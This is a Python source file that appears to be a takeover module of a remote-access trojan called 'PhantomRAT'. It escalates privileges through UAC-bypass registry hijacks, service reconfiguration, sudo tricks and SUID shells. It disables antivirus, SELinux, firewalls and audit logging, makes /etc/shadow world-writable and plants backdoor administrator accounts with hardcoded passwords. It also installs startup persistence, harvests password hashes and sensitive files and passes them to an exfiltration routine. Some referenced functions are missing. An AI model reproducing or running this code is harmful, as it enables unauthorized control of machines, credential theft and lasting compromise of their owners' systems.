import os
import sys
import subprocess
import platform
import ctypes
import winreg
import psutil
import time
import random
import hashlib
import json
import socket
import getpass
from cryptography.fernet import Fernet
import base64

def is_admin():
    """Check if running as administrator/root"""
    if platform.system() == 'Windows':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.getuid() == 0

def privilege_escalation():
    """Attempt privilege escalation"""
    print("[*] Attempting privilege escalation...")
    
    if is_admin():
        print("[+] Already running with elevated privileges")
        return True
    
    if platform.system() == 'Windows':
        return windows_escalation()
    else:
        return linux_escalation()

def windows_escalation():
    """Windows privilege escalation techniques"""
    techniques = [
        escalate_uac_bypass,
        escalate_service_permissions,
        escalate_dll_hijack,
        escalate_token_impersonation,
        escalate_scheduled_task
    ]
    
    for technique in techniques:
        try:
            if technique():
                print(f"[+] Escalation successful via {technique.__name__}")
                return True
        except Exception as e:
            print(f"[-] {technique.__name__} failed: {e}")
    
    return False

def linux_escalation():
    """Linux privilege escalation techniques"""
    techniques = [
        escalate_sudo_vulnerability,
        escalate_suid_binaries,
        escalate_cron_jobs,
        escalate_capabilities,
        escalate_docker_escape
    ]
    
    for technique in techniques:
        try:
            if technique():
                print(f"[+] Escalation successful via {technique.__name__}")
                return True
        except Exception as e:
            print(f"[-] {technique.__name__} failed: {e}")
    
    return False

def escalate_uac_bypass():
    """Bypass UAC on Windows"""
    # Known UAC bypass techniques
    bypass_methods = [
        # Event Viewer bypass
        r'C:\Windows\System32\eventvwr.exe',
        # Fodhelper bypass
        r'C:\Windows\System32\fodhelper.exe',
        # SDCLT bypass
        r'C:\Windows\System32\sdclt.exe'
    ]
    
    for method in bypass_methods:
        if os.path.exists(method):
            try:
                # Create registry key for bypass
                key_path = r"Software\Classes\ms-settings\Shell\Open\Command"
                
                # Get current executable path
                exe_path = os.path.abspath(sys.argv[0])
                
                # Set registry value
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
                
                # Execute bypass
                subprocess.run([method], capture_output=True)
                
                # Cleanup
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                
                return True
            except:
                pass
    
    return False

def escalate_service_permissions():
    """Exploit service permissions for escalation"""
    try:
        # Check for services with weak permissions
        cmd = 'sc query'
        if platform.system() == 'Windows':
            result = subprocess.run(['sc', 'query'], capture_output=True, text=True)
            
            # Look for services we can modify
            # This is a simplified check
            services = ['VulnerableService', 'WeakService']
            
            for service in services:
                if service in result.stdout:
                    # Try to modify service
                    subprocess.run(['sc', 'config', service, 'binPath=', f'"{sys.argv[0]}"'], 
                                  capture_output=True)
                    subprocess.run(['sc', 'start', service], capture_output=True)
                    return True
    except:
        pass
    
    return False

def escalate_sudo_vulnerability():
    """Exploit sudo vulnerabilities on Linux"""
    vulnerabilities = [
        # CVE-2021-3156 (Baron Samedit)
        ("sudoedit -s '", "\\' 'A'*$(($(ulimit -n)-2))"),
        # CVE-2019-14287
        ("sudo -u#-1", "id"),
    ]
    
    for vuln, payload in vulnerabilities:
        try:
            result = subprocess.run(f'sudo {vuln}{payload}', 
                                   shell=True, capture_output=True, text=True)
            if result.returncode == 0 and 'root' in result.stdout:
                return True
        except:
            pass
    
    return False

def escalate_suid_binaries():
    """Find and exploit SUID binaries"""
    try:
        # Find SUID binaries
        result = subprocess.run(
            "find / -perm -4000 -type f 2>/dev/null",
            shell=True, capture_output=True, text=True
        )
        
        suid_binaries = result.stdout.split('\n')
        
        # Known exploitable SUID binaries
        exploitable = [
            '/bin/bash',
            '/bin/cp',
            '/bin/chmod',
            '/bin/chown',
            '/bin/mount',
            '/usr/bin/find',
            '/usr/bin/nmap',
            '/usr/bin/vim',
            '/usr/bin/less',
            '/usr/bin/more'
        ]
        
        for binary in exploitable:
            if binary in suid_binaries:
                # Different exploits for different binaries
                if 'bash' in binary:
                    subprocess.run(f'{binary} -p', shell=True)
                    return True
                elif 'find' in binary:
                    subprocess.run(f'{binary} . -exec /bin/sh \\;', shell=True)
                    return True
                elif 'nmap' in binary:
                    subprocess.run(f'echo "os.execute(\'/bin/sh\')" | {binary} --interactive', shell=True)
                    return True
    except:
        pass
    
    return False

def full_system_takeover():
    """Take full control of the system"""
    if not is_admin():
        print("[-] Need admin privileges for full takeover")
        return False
    
    print("[*] Initiating full system takeover...")
    
    # 1. Disable security software
    disable_security()
    
    # 2. Take ownership of critical files
    take_ownership()
    
    # 3. Modify system configuration
    modify_system_config()
    
    # 4. Install rootkit
    install_rootkit()
    
    # 5. Control user accounts
    control_users()
    
    print("[+] Full system takeover complete")
    return True

def disable_security():
    """Disable security software"""
    if platform.system() == 'Windows':
        # Disable Windows Defender
        try:
            subprocess.run(['powershell', 'Set-MpPreference', '-DisableRealtimeMonitoring', '$true'], 
                          capture_output=True)
            subprocess.run(['powershell', 'Set-MpPreference', '-DisableBehaviorMonitoring', '$true'],
                          capture_output=True)
            subprocess.run(['powershell', 'Set-MpPreference', '-DisableBlockAtFirstSeen', '$true'],
                          capture_output=True)
            
            # Stop Defender service
            subprocess.run(['net', 'stop', 'WinDefend'], capture_output=True)
            subprocess.run(['sc', 'config', 'WinDefend', 'start=', 'disabled'], capture_output=True)
        except:
            pass
    
    else:
        # Disable Linux security
        try:
            # Disable SELinux
            subprocess.run(['setenforce', '0'], capture_output=True)
            subprocess.run(['sed', '-i', 's/SELINUX=enforcing/SELINUX=disabled/g', '/etc/selinux/config'],
                          capture_output=True)
            
            # Disable AppArmor
            subprocess.run(['systemctl', 'stop', 'apparmor'], capture_output=True)
            subprocess.run(['systemctl', 'disable', 'apparmor'], capture_output=True)
        except:
            pass

def take_ownership():
    """Take ownership of critical system files"""
    critical_files = []
    
    if platform.system() == 'Windows':
        critical_files = [
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\Windows\\System32\\config\\SYSTEM',
            'C:\\Windows\\System32\\cmd.exe',
            'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
        ]
        
        for file in critical_files:
            if os.path.exists(file):
                try:
                    # Take ownership
                    subprocess.run(['takeown', '/f', file], capture_output=True)
                    subprocess.run(['icacls', file, '/grant', 'Administrators:F'], capture_output=True)
                except:
                    pass
    
    else:
        critical_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/sudoers',
            '/bin/bash',
            '/bin/sh'
        ]
        
        for file in critical_files:
            if os.path.exists(file):
                try:
                    # Make writable
                    subprocess.run(['chmod', '777', file], capture_output=True)
                except:
                    pass

def modify_system_config():
    """Modify system configuration for persistence"""
    if platform.system() == 'Windows':
        # Modify registry
        try:
            # Disable UAC
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
                                  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            
            # Disable Windows Update
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU")
            winreg.SetValueEx(key, "NoAutoUpdate", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            # Disable Firewall
            subprocess.run(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'],
                          capture_output=True)
        except:
            pass
    
    else:
        # Modify Linux configuration
        try:
            # Allow root login via SSH
            with open('/etc/ssh/sshd_config', 'a') as f:
                f.write('\nPermitRootLogin yes\n')
            
            # Disable firewall
            subprocess.run(['systemctl', 'stop', 'firewalld'], capture_output=True)
            subprocess.run(['systemctl', 'disable', 'firewalld'], capture_output=True)
            subprocess.run(['iptables', '-F'], capture_output=True)
            
            # Disable auditd
            subprocess.run(['systemctl', 'stop', 'auditd'], capture_output=True)
            subprocess.run(['systemctl', 'disable', 'auditd'], capture_output=True)
        except:
            pass

def install_rootkit():
    """Install rootkit for stealth"""
    print("[*] Installing rootkit...")
    
    # This is a simplified example
    # Real rootkit would be much more complex
    
    rootkit_code = '''
    # Simple rootkit example
    import os
    import sys
    
    class SimpleRootkit:
        def __init__(self):
            self.hidden_processes = []
            self.hidden_files = []
            
        def hide_process(self, pid):
            self.hidden_processes.append(pid)
            
        def hide_file(self, path):
            self.hidden_files.append(path)
            
        def intercept_system_calls(self):
            # Hook system calls here
            pass
    '''
    
    # Save rootkit
    rootkit_path = '/tmp/.phantom_rootkit.py'
    with open(rootkit_path, 'w') as f:
        f.write(rootkit_code)
    
    # Make executable
    os.chmod(rootkit_path, 0o755)
    
    # Load rootkit
    try:
        exec(open(rootkit_path).read())
        print("[+] Rootkit installed")
        return True
    except:
        print("[-] Rootkit installation failed")
        return False

def control_users():
    """Take control of user accounts"""
    if platform.system() == 'Windows':
        # Create backdoor admin account
        try:
            username = "SystemAdmin"
            password = "P@ssw0rd123!"
            
            subprocess.run(['net', 'user', username, password, '/add'], capture_output=True)
            subprocess.run(['net', 'localgroup', 'Administrators', username, '/add'], capture_output=True)
            
            print(f"[+] Created backdoor admin: {username}/{password}")
            return True
        except:
            pass
    
    else:
        # Create backdoor root account
        try:
            username = "phantom"
            password = "phantom123"
            
            # Create user
            subprocess.run(['useradd', '-m', '-s', '/bin/bash', username], capture_output=True)
            
            # Set password
            from subprocess import Popen, PIPE
            proc = Popen(['passwd', username], stdin=PIPE)
            proc.communicate(input=f'{password}\n{password}\n'.encode())
            
            # Add to sudoers
            with open('/etc/sudoers.d/phantom', 'w') as f:
                f.write(f'{username} ALL=(ALL) NOPASSWD:ALL\n')
            
            print(f"[+] Created backdoor user: {username}/{password}")
            return True
        except:
            pass
    
    return False

def install_backdoor():
    """Install persistent backdoor"""
    print("[*] Installing backdoor...")
    
    if platform.system() == 'Windows':
        # Windows backdoor
        backdoor_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'phantom_backdoor.exe')
        
        # Copy current executable
        shutil.copy2(sys.argv[0], backdoor_path)
        
        # Add to registry
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                  r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, "PhantomBackdoor", 0, winreg.REG_SZ, backdoor_path)
            winreg.CloseKey(key)
        except:
            pass
        
        print(f"[+] Windows backdoor installed: {backdoor_path}")
    
    else:
        # Linux backdoor
        backdoor_path = '/etc/init.d/phantom_backdoor'
        
        # Create init script
        init_script = '''#!/bin/bash
        # PhantomRAT Backdoor
        while true; do
            python3 /tmp/.phantom_rat.py 2>/dev/null
            sleep 30
        done
        '''
        
        with open(backdoor_path, 'w') as f:
            f.write(init_script)
        
        os.chmod(backdoor_path, 0o755)
        
        # Add to rc.local
        with open('/etc/rc.local', 'a') as f:
            f.write(f'\n{backdoor_path} &\n')
        
        print(f"[+] Linux backdoor installed: {backdoor_path}")
    
    return True

def exfil_system_data():
    """Exfiltrate sensitive system data"""
    print("[*] Exfiltrating system data...")
    
    system_data = {
        'hostname': socket.gethostname(),
        'os': platform.platform(),
        'user': getpass.getuser(),
        'processes': [],
        'network': [],
        'credentials': [],
        'sensitive_files': []
    }
    
    # Collect running processes
    try:
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            system_data['processes'].append(proc.info)
    except:
        pass
    
    # Collect network information
    try:
        system_data['network'].extend(get_network_info())
    except:
        pass
    
    # Collect credentials (simplified)
    try:
        system_data['credentials'].extend(get_credentials())
    except:
        pass
    
    # Find sensitive files
    try:
        system_data['sensitive_files'].extend(find_sensitive_files())
    except:
        pass
    
    # Encrypt and exfiltrate
    from phantomrat_extortion import exfil_data
    exfil_data({'type': 'system_takeover', 'data': system_data})
    
    print(f"[+] System data exfiltrated: {len(system_data['processes'])} processes, {len(system_data['sensitive_files'])} files")
    
    return True

def get_network_info():
    """Collect network information"""
    network_info = []
    
    try:
        # Network interfaces
        for name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_info.append({
                        'interface': name,
                        'ip': addr.address,
                        'netmask': addr.netmask
                    })
        
        # Network connections
        for conn in psutil.net_connections():
            if conn.laddr:
                network_info.append({
                    'connection': f"{conn.laddr.ip}:{conn.laddr.port} -> {conn.raddr.ip if conn.raddr else ''}:{conn.raddr.port if conn.raddr else ''}",
                    'status': conn.status,
                    'pid': conn.pid
                })
    except:
        pass
    
    return network_info

def get_credentials():
    """Collect credentials (simplified)"""
    credentials = []
    
    if platform.system() == 'Windows':
        # Windows credential extraction would go here
        # This is simplified
        pass
    else:
        # Linux shadow file
        try:
            with open('/etc/shadow', 'r') as f:
                for line in f.readlines():
                    if ':' in line:
                        parts = line.split(':')
                        if len(parts) > 1 and parts[1] not in ['*', '!']:
                            credentials.append({
                                'user': parts[0],
                                'hash': parts[1]
                            })
        except:
            pass
    
    return credentials

def find_sensitive_files():
    """Find sensitive files on system"""
    sensitive_files = []
    
    search_patterns = [
        '*.txt', '*.doc', '*.docx', '*.pdf', '*.xls', '*.xlsx',
        '*.sql', '*.db', '*.config', '*.conf', '*.yml', '*.yaml',
        '*.json', '*.xml', '*.pem', '*.key', '*.crt', '*.pfx'
    ]
    
    search_paths = [
        '/home', '/root', '/etc', '/var', '/opt',
        'C:\\Users', 'C:\\Windows\\System32\\config'
    ]
    
    for search_path in search_paths:
        if os.path.exists(search_path):
            for pattern in search_patterns:
                try:
                    import glob
                    for file in glob.glob(os.path.join(search_path, '**', pattern), recursive=True):
                        # Check file size and content
                        if os.path.getsize(file) < 10 * 1024 * 1024:  # 10MB limit
                            sensitive_files.append(file)
                except:
                    pass
    
    return sensitive_files[:100]  # Limit to 100 files

if __name__ == "__main__":
    # Test functions
    print("Testing system takeover functions...")
    
    if privilege_escalation():
        print("Privilege escalation successful")
        
        if full_system_takeover():
            print("System takeover complete")
            
            install_backdoor()
            exfil_system_data()
    else:
        print("Privilege escalation failed")
